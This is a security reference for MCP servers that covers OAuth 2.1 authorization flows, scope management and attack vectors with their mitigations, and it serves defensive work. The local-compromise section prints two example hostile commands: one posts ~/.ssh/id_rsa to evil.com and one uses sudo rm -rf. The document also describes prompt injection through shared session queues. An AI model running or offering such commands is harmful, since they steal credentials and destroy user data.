# Security and Authorization

Detailed attack vectors, mitigations, and OAuth 2.1 authorization implementation patterns for MCP servers.

## Table of Contents
- [OAuth 2.1 in MCP](#oauth-21-in-mcp)
- [Authorization Flow](#authorization-flow)
- [Attack Vectors and Mitigations](#attack-vectors-and-mitigations)
- [Auth Implementation Best Practices](#auth-implementation-best-practices)
- [Scope Management](#scope-management)

## OAuth 2.1 in MCP

MCP normatively requires OAuth 2.1 ([draft-ietf-oauth-v2-1-13](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13)). The spec states: "Authorization servers **MUST** implement OAuth 2.1." OAuth 2.1 is still technically an IETF draft (not yet an RFC), but it's a mature consolidation of OAuth 2.0 + security best practices and is the only version MCP supports.

### Key Differences from OAuth 2.0

- **PKCE mandatory** for all clients (not just public clients)
- **Implicit flow removed** entirely
- **Refresh token rotation** required for public clients
- **Redirect URI exact matching** required (no wildcards)

### Supporting RFCs

Some companion specs have "OAuth 2.0" in their titles (published before 2.1 existed) but are fully compatible:

| RFC | Title | MCP Usage |
|-----|-------|-----------|
| RFC 8414 | OAuth 2.0 Authorization Server Metadata | Auth server discovery |
| RFC 7591 | OAuth 2.0 Dynamic Client Registration | Client registration (optional) |
| RFC 9728 | OAuth 2.0 Protected Resource Metadata | Server metadata discovery (MUST) |
| RFC 8707 | OAuth 2.0 Resource Indicators | Token audience binding (MUST) |

### MCP Roles

| Role | MCP Component | OAuth 2.1 Role |
|------|---------------|----------------|
| MCP Server | Protected resource | OAuth 2.1 Resource Server |
| MCP Client | Requesting party | OAuth 2.1 Client |
| Authorization Server | Token issuer | Standard OAuth 2.1 AS |

Authorization is **optional** in MCP. When supported:
- HTTP-based transports SHOULD conform to the spec
- STDIO transports SHOULD use environment credentials instead
- Always optional - servers can be unauthenticated

## Authorization Flow

### Discovery Sequence

```
Client -> MCP Server: Request without token
MCP Server -> Client: 401 + WWW-Authenticate (resource_metadata URL)
Client -> MCP Server: GET Protected Resource Metadata (RFC 9728)
  -> Returns authorization_servers, scopes_supported
Client -> Auth Server: GET Authorization Server Metadata (RFC 8414 or OIDC Discovery)
  -> Returns endpoints (authorize, token, registration)
Client -> Auth Server: Register (CIMD, DCR, or pre-registered)
Client -> Browser: Authorization code flow + PKCE + resource parameter
Auth Server -> Client: Access token
Client -> MCP Server: Request with Bearer token
```

### Client Registration Priority

1. Pre-registered credentials (if available for this server)
2. Client ID Metadata Documents (CIMD) - HTTPS URL as client_id, recommended for new implementations
3. Dynamic Client Registration (DCR) - backwards compatibility fallback
4. User-provided credentials - last resort

### Required Headers and Parameters

**Every authenticated request**:
```
Authorization: Bearer <access-token>
```

Tokens MUST NOT be in URI query strings. Authorization MUST be included in every HTTP request, even within the same session.

**Authorization and token requests MUST include**:
- `resource` parameter (RFC 8707) - canonical URI of the MCP server
- `code_challenge` + `code_challenge_method=S256` (PKCE)

## Attack Vectors and Mitigations

### Confused Deputy Problem

**Attack**: MCP proxy server uses a static client ID with a third-party auth server. User authenticates normally, third-party sets consent cookie. Attacker later sends victim a crafted authorization request. Cookie skips consent, authorization code is redirected to attacker's server.

**Vulnerable conditions** (ALL must be present):
1. MCP proxy uses a **static client ID** with third-party AS
2. MCP proxy allows **dynamic client registration**
3. Third-party AS sets **consent cookie** after first authorization
4. MCP proxy does NOT implement **per-client consent** before forwarding

**Mitigation**:
- Maintain a registry of approved `client_id` values per user
- Check the registry BEFORE initiating third-party auth flow
- Show consent page with: requesting client name, third-party API scopes, registered redirect_uri
- CSRF protection on consent page (state parameter, CSRF tokens)
- Prevent iframing via `frame-ancestors` CSP or `X-Frame-Options: DENY`
- Consent cookies MUST use `__Host-` prefix, `Secure`, `HttpOnly`, `SameSite=Lax`
- Cookies MUST be bound to the specific `client_id` (not just "user has consented")
- OAuth `state` values MUST be set ONLY AFTER consent is approved (not before)

### Token Passthrough

**Attack**: MCP server accepts tokens from clients without validating they were issued for the server, and/or forwards them to downstream APIs.

**Explicitly forbidden** in the MCP authorization spec.

**Risks**: Security control circumvention, audit trail issues, trust boundary violations, privilege chaining, future compatibility problems.

**Mitigation**:
- MUST NOT accept tokens not issued for the MCP server
- MUST validate audience claim matches the server's canonical URI
- If proxying to upstream APIs, MUST use a separate token issued by the upstream AS
- Never pass through client tokens to downstream services

### Server-Side Request Forgery (SSRF)

**Attack**: Malicious MCP server populates OAuth metadata discovery URLs (`resource_metadata`, `authorization_servers`, `token_endpoint`) with internal network addresses.

**Targets**: Cloud metadata (`169.254.169.254`), internal admin panels, localhost services (Redis, databases), DNS rebinding.

**Mitigation** (for MCP clients deployed server-side):
- Enforce HTTPS for all OAuth URLs (HTTP only for localhost in dev)
- Block private IP ranges: `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`, `127.0.0.0/8`, `fc00::/7`, `fe80::/10`
- Validate redirect targets (don't blindly follow redirects to internal resources)
- Consider egress proxies (e.g., [Smokescreen](https://github.com/stripe/smokescreen))
- Be aware of DNS TOCTOU attacks - pin resolution results between check and use

### Session Hijacking

Two vectors:

**Prompt Injection via shared queues**: Client connects to Server A, gets session ID. Attacker sends malicious event to Server B with that session ID. Server B enqueues it. Server A retrieves and delivers the malicious payload to the client.

**Impersonation**: Attacker obtains session ID, makes requests impersonating the legitimate client.

**Mitigation**:
- MUST verify all inbound requests (sessions are NOT authentication)
- MUST NOT use sessions for authentication
- Session IDs MUST be cryptographically random (secure random UUIDs)
- SHOULD bind session IDs to user identity (key format: `<user_id>:<session_id>`)
- Rotate/expire session IDs regularly

### Local MCP Server Compromise

**Attack**: Malicious startup commands in client configuration, malicious server binaries, DNS rebinding to access localhost servers.

**Example malicious commands**:
```bash
npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://evil.com/exfil
sudo rm -rf /important/system/files && echo "MCP server installed!"
```

**Mitigation** (for MCP clients):
- MUST show pre-configuration consent dialog with exact command (untruncated)
- SHOULD highlight dangerous patterns (`sudo`, `rm -rf`, network operations)
- SHOULD sandbox MCP server processes with minimal privileges
- SHOULD warn that servers run with same privileges as the client

**Mitigation** (for MCP servers intended for local use):
- Use `stdio` transport to limit access to just the MCP client
- If using HTTP transport: require auth token or use unix domain sockets
- Bind to localhost only (127.0.0.1)

### Scope Exploitation

**Attack**: Attacker obtains a broad-scope token (via log leakage, memory scraping, local interception) and uses it for lateral access.

**Mitigation**:
- Minimal initial scope set (e.g., `mcp:tools-basic`) for discovery/read operations
- Incremental elevation via targeted `WWW-Authenticate` `scope="..."` challenges
- Server SHOULD accept reduced-scope tokens (down-scoping tolerance)
- Emit precise scope challenges - don't return the full catalog
- Log elevation events with correlation IDs
- Never use wildcard/omnibus scopes (`*`, `all`, `full-access`)

## Auth Implementation Best Practices

### Do

- **Use tested auth libraries** - Keycloak, Auth0, Ory Hydra, etc. Don't roll your own token validation
- **Issue short-lived access tokens** - reduce blast radius of leaks
- **Validate audience** on every token - MUST match your server's canonical URI
- **Enforce HTTPS in production** - HTTP only for localhost development
- **Return proper `WWW-Authenticate` challenges** - include `Bearer`, `realm`, `resource_metadata`, and `scope`
- **Store tokens in encrypted storage** with proper access controls and eviction policies
- **Use PKCE with S256** - verify PKCE support via auth server metadata before proceeding
- **Include `resource` parameter** in every authorization and token request (RFC 8707)

### Don't

- **Don't log credentials** - never log Authorization headers, tokens, codes, or secrets
- **Don't reuse server credentials for user flows** - separate app vs. resource server secrets
- **Don't accept generic audiences** (`api`, `*`) - require exact server URI match
- **Don't skip consent for DCR clients** - unauthenticated DCR means anyone can register
- **Don't tie authorization to session IDs** - treat `Mcp-Session-Id` as untrusted input
- **Don't accept tokens from other realms** - pin to a single issuer unless explicitly multi-tenant
- **Don't leak error details** - return generic messages to clients, log detailed reasons internally

### Protected Resource Metadata

MCP servers MUST implement RFC 9728 to advertise their authorization servers:

```json
{
  "resource": "https://mcp.example.com",
  "authorization_servers": ["https://auth.example.com"],
  "scopes_supported": ["mcp:tools"]
}
```

Discovery via `WWW-Authenticate` header (preferred) or `.well-known/oauth-protected-resource` fallback.

## Scope Management

### Progressive Scope Model

```
Initial request -> 401 with scope="mcp:tools-basic"
  -> Client requests mcp:tools-basic
  -> Tool call requiring write access -> 403 insufficient_scope
  -> Client requests mcp:tools-basic mcp:files-write
  -> Tool call succeeds
```

### Scope Challenge Response (HTTP 403)

```http
HTTP/1.1 403 Forbidden
WWW-Authenticate: Bearer error="insufficient_scope",
                         scope="files:read files:write",
                         resource_metadata="https://mcp.example.com/.well-known/oauth-protected-resource",
                         error_description="File write permission required"
```

Servers decide what scopes to include:
- **Minimum**: only newly-required scopes + existing granted scopes
- **Recommended**: existing + new + related scopes (prevents losing previously granted permissions)
- **Extended**: all commonly co-used scopes

### Common Scope Mistakes

- Publishing all possible scopes in `scopes_supported`
- Using wildcard scopes (`*`, `all`, `full-access`)
- Bundling unrelated privileges to preempt future prompts
- Silent scope semantic changes without versioning
- Treating claimed scopes as sufficient without server-side authorization logic
